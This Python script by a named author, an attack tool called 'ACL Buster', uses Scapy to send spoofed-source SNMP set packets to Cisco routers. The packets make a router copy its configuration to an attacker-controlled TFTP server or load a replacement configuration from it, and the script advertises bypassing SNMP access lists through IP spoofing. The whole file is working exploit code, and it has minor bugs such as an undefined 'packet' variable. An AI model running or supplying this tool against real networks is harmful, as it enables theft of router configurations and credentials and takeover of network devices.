#!/usr/bin/env python
"""
Description: Simple Script To Read/Write Cisco Configurations via SNMP Write
Date: 1/3/2020
Author: Cody Winkler
Contact: @c2thewinkler(twitter)

Notes:

- Python 2.7 and Python3 compatible
- Not compatible with Scapy 2.4.2 without specifying destination MAC address in request
"""
import sys
import argparse
from scapy.all import *

def banner():

    print("          _____ _        ____            _            ")
    print("    /\   / ____| |      |  _ \          | |           ")
    print("   /  \ | |    | |      | |_) |_   _ ___| |_ ___ _ __ ")
    print("  / /\ \| |    | |      |  _ <| | | / __| __/ _ \ '__|")
    print(" / ____ \ |____| |____  | |_) | |_| \__ \ ||  __/ |   ")
    print("/_/    \_\_____|______| |____/ \__,_|___/\__\___|_|   ")
    print("https://github.com/m0rph-1               @c2thewinkler\n")
    print("\nTFTP Read/Write of Cisco Configurations VIA SNMP Write\n")

def parse_options():

    global parser
    formatter = lambda prog: argparse.HelpFormatter(prog,max_help_position=50)
    parser = argparse.ArgumentParser(description='Use -sp to bypass SNMP ACL\'s that don\'t specify deny ip any any', formatter_class=formatter)
    parser.add_argument("-s", "--src_ip", type=str, help="IP address of TFTP server", required=True)
    parser.add_argument("-d", "--dst_ip", type=str, help="IP address to connect to", required=True)
    parser.add_argument("-sp", "--spoof", type=str, help="IP address to spoof (missing implicit deny ACL bypass)", required=False)
    parser.add_argument("-t", "--type", type=str, help="Type of TFTP Transaction (READ/WRITE) to use", required=True)
    parser.add_argument("-c", "--community", type=str, help="SNMP community string to use", required=True)
    parser.add_argument("-f", "--file", type=str, help="File name for router config", required=True)
    args = parser.parse_args()
    return args


def main(args):

    if args.spoof != None:

        src_ip = args.src_ip
        dst_ip = args.dst_ip
        spoof = args.spoof
        file = args.file
        com_string = args.community

    elif args.spoof == None:

        src_ip = args.src_ip
        dst_ip = args.dst_ip
        spoof = args.spoof
        file = args.file
        com_string = args.community
        spoof = args.src_ip

    else:

        print("\n[!] You need to specify more arguments\n")
        parser.print_help(sys.stderr)
        sys.exit()

    if "READ" in args.type:

        try:

            print("[+] Attempting to get router configuration...\n")
            datagram = IP(src="%s" % spoof,dst="%s" % dst_ip)/UDP(sport=160,dport=161)/SNMP(community="%s" % com_string,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + src_ip),value=file)]))
            send(datagram)
            print("[+] Sent datagram with attributes:\n")
            ls(packet)
            print("\n[+] Check your TFTP directory!")

        except Exception as msg:

            print("[!] " + msg)

    elif "WRITE" in args.type:

        try:

            print("[+] Attempting to upload new router configuration...\n")
            datagram = IP(src="%s" % spoof,dst="%s" % dst_ip)/UDP(sport=160,dport=161)/SNMP(community="%s" % com_string,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53." + src_ip),value=file)]))
            send(datagram)
            print("[+] Sent datagram with attributes:\n")
            ls(packet)
            print("\n[+] Check router configuration!")

        except Exception as msg:

            print("[!] " + msg)


if __name__ in "__main__":

    banner()
    args = parse_options()
    main(args)
